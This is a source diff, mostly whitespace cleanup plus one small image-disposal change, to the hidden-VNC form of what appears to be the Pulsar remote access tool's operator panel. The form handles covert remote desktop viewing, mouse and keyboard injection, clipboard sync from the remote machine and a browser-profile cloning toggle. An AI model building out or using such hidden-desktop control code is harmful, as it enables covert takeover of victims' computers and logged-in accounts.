@@ -36,7 +36,7 @@ namespace Pulsar.Server.Forms
         /// Monitors clipboard changes on the server to send to the client
         /// </summary>
         private readonly ClipboardMonitor _clipboardMonitor;
-        
+
         /// <summary>
         /// States whether bidirectional clipboard sync is enabled
         /// </summary>
@@ -173,7 +173,7 @@ namespace Pulsar.Server.Forms
             picDesktop.MouseWheel += PicDesktop_MouseWheel;
             picDesktop.KeyDown += PicDesktop_KeyDown;
             picDesktop.KeyUp += PicDesktop_KeyUp;
-            
+
             picDesktop.TabStop = true;
             picDesktop.Focus();
         }
@@ -206,9 +206,9 @@ namespace Pulsar.Server.Forms
 
             _hVNCHandler.EnableMouseInput = _enableMouseInput;
             _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;
-            
+
             _hVNCHandler.MaxFramesPerSecond = 30;
-            
+
             _hVNCHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex, useGPU);
         }
 
@@ -282,7 +282,7 @@ namespace Pulsar.Server.Forms
             _sizeFrames++;
 
             double elapsedSeconds = _stopwatch.Elapsed.TotalSeconds;
-            
+
             if (_hVNCHandler.CurrentFps > 0)
             {
                 _lastFps = _hVNCHandler.CurrentFps;
@@ -320,7 +320,7 @@ namespace Pulsar.Server.Forms
 
             cbMonitors.SelectedIndex = 0;
         }
-        
+
         /// <summary>
         /// Updates the title with the current frames per second.
         /// </summary>
@@ -351,13 +351,14 @@ namespace Pulsar.Server.Forms
             UnregisterMessageHandler();
             _hVNCHandler.Dispose();
             _clipboardMonitor?.Dispose();
-            
-            _connectClient.Send(new SetClipboardMonitoringEnabled 
-            { 
-                Enabled = false 
+
+            _connectClient.Send(new SetClipboardMonitoringEnabled
+            {
+                Enabled = false
             });
-            
-            picDesktop.Image?.Dispose();
+
+            picDesktop.GetImageSafe?.Dispose();
+            picDesktop.GetImageSafe = null;
         }
 
         private void FrmHVNC_Resize(object sender, EventArgs e)
@@ -411,7 +412,7 @@ namespace Pulsar.Server.Forms
         private void btnMouse_Click(object sender, EventArgs e)
         {
             _enableMouseInput = !_enableMouseInput;
-            
+
             if (_enableMouseInput)
             {
                 this.picDesktop.Cursor = Cursors.Hand;
@@ -435,7 +436,7 @@ namespace Pulsar.Server.Forms
         private void btnKeyboard_Click(object sender, EventArgs e)
         {
             _enableKeyboardInput = !_enableKeyboardInput;
-            
+
             if (_enableKeyboardInput)
             {
                 this.picDesktop.Cursor = Cursors.Hand;
@@ -464,9 +465,9 @@ namespace Pulsar.Server.Forms
             _clipboardMonitor.IsEnabled = _enableBidirectionalClipboard;
             Debug.WriteLine(_clipboardMonitor.IsEnabled ? "HVNC: Clipboard monitor enabled." : "HVNC: Clipboard monitor disabled.");
 
-            _connectClient.Send(new SetClipboardMonitoringEnabled 
-            { 
-                Enabled = _enableBidirectionalClipboard 
+            _connectClient.Send(new SetClipboardMonitoringEnabled
+            {
+                Enabled = _enableBidirectionalClipboard
             });
 
             if (_enableBidirectionalClipboard)
@@ -476,7 +477,7 @@ namespace Pulsar.Server.Forms
                     try
                     {
                         Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
-                        
+
                         if (Clipboard.ContainsText())
                         {
                             string clipboardText = Clipboard.GetText();
@@ -495,7 +496,7 @@ namespace Pulsar.Server.Forms
                 clipboardThread.SetApartmentState(ApartmentState.STA);
                 clipboardThread.Start();
             }
-            
+
             this.ActiveControl = picDesktop;
         }
 
@@ -589,7 +590,7 @@ namespace Pulsar.Server.Forms
         private void cLONEBROWSERPROFILEToolStripMenuItem_Click(object sender, EventArgs e)
         {
             cLONEBROWSERPROFILEToolStripMenuItem.Checked = !cLONEBROWSERPROFILEToolStripMenuItem.Checked;
-            
+
             if (cLONEBROWSERPROFILEToolStripMenuItem.Checked)
             {
                 cLONEBROWSERPROFILEToolStripMenuItem.Text = "CLONE BROWSER PROFILE";
@@ -663,7 +664,7 @@ namespace Pulsar.Server.Forms
             uint message = 0x0200; // WM_MOUSEMOVE
             int wParam = 0;
             int lParam = (e.Y << 16) | (e.X & 0xFFFF);
-            
+
             _hVNCHandler.SendMouseEvent(message, wParam, lParam);
         }
 
@@ -735,24 +736,24 @@ namespace Pulsar.Server.Forms
         {
             int vk = (int)keyCode;
             uint scanCode = MapVirtualKey((uint)vk, 0); // MAPVK_VK_TO_VSC = 0
-            
+
             int lParam = 0;
-            
+
             lParam |= 1;
-            
+
             lParam |= (int)(scanCode << 16);
-            
+
             if (IsExtendedKey(vk))
             {
                 lParam |= (1 << 24);
             }
-            
+
             if (isKeyUp)
             {
                 lParam |= (1 << 30);
                 lParam |= (1 << 31);
             }
-            
+
             return lParam;
         }
 
